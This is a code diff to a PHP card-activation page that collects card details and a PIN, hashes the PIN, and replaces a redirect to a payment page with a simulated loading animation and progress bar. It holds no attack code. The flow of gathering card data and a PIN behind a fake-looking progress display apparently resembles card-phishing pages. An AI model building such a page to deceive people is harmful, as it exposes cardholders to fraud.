@@ -57,7 +57,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $errors['confirm_pin'] = 'PINs do not match';
     }
     
-    // If no errors, save to database and redirect to pending page
+    // If no errors, save to database and show loading animation
     if (empty($errors)) {
         $pin_hash = password_hash($pin, PASSWORD_DEFAULT);
         
@@ -72,9 +72,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             // Store request ID in session
             $_SESSION['request_id'] = $request_id;
             
-            // Redirect to payment page
-            header('Location: payment.php');
-            exit();
+            // Set success flag to trigger loading animation
+            $success = true;
         } else {
             $errors['general'] = 'Failed to submit activation request. Please try again.';
         }
@@ -100,8 +99,18 @@ $card_data = $_SESSION['card_data'];
             <p class="tagline"><?php echo APP_TAGLINE; ?></p>
         </header>
 
+        <!-- Loading Container (hidden by default, shown after successful submission) -->
+        <div class="loading-container" id="processingContainer" style="display: none;">
+            <div class="loading-spinner"></div>
+            <p class="loading-text" id="loadingText">Processing your activation...</p>
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <p class="progress-text"><span id="progressPercent">0</span>% Complete</p>
+        </div>
+
         <!-- PIN Setup Container -->
-        <div class="pin-setup-container">
+        <div class="pin-setup-container" id="pinSetupContainer">
             <h2 class="form-title">Complete Card Activation</h2>
             <p class="form-subtitle">Enter your card details and set up your secure PIN</p>
             
@@ -208,21 +217,10 @@ $card_data = $_SESSION['card_data'];
         </div>
     </div>
     
-    <script src="js/pin-setup.js"></script>
-</body>
-</html>
-                </div>
-                <div class="modal-detail-item">
-                    <span class="detail-label">Status:</span>
-                    <span class="detail-value">Active</span>
-                </div>
-            </div>
-            <p style="font-size: 12px; color: var(--text-light); margin-top: 15px;">
-                Please keep your PIN secure and never share it with anyone.
-            </p>
-        </div>
-    </div>
-    
+    <script>
+        // Pass success flag from PHP to JavaScript
+        const activationSuccess = <?php echo $success ? 'true' : 'false'; ?>;
+    </script>
     <script src="js/pin-setup.js"></script>
 </body>
 </html>
